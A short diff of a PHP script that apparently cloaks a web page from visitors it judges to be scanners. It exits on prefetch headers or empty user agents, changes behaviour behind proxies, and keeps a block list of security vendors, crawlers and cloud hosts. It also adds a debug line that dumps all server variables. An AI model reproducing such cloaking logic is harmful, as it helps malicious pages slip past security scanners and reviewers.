@@ -1,5 +1,6 @@
 <?php
-	if(isset($_SERVER['HTTP_X_PURPOSE']) || $_SERVER['HTTP_USER_AGENT'] == ''){
+	var_dump($_SERVER);exit;
+  if(isset($_SERVER['HTTP_X_PURPOSE']) || $_SERVER['HTTP_USER_AGENT'] == ''){
     exit();
   }
 
@@ -74,7 +75,6 @@
     if(isset($_SERVER['HTTP_VIA']) || isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
       $action = 'theme';
     }
-		echo $action;exit;
   }
 
   $asnlist = array('facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee','twitter','mail.ru','vkontakte','aruba','ovh sas','online s.a.s','denetron','contabo');
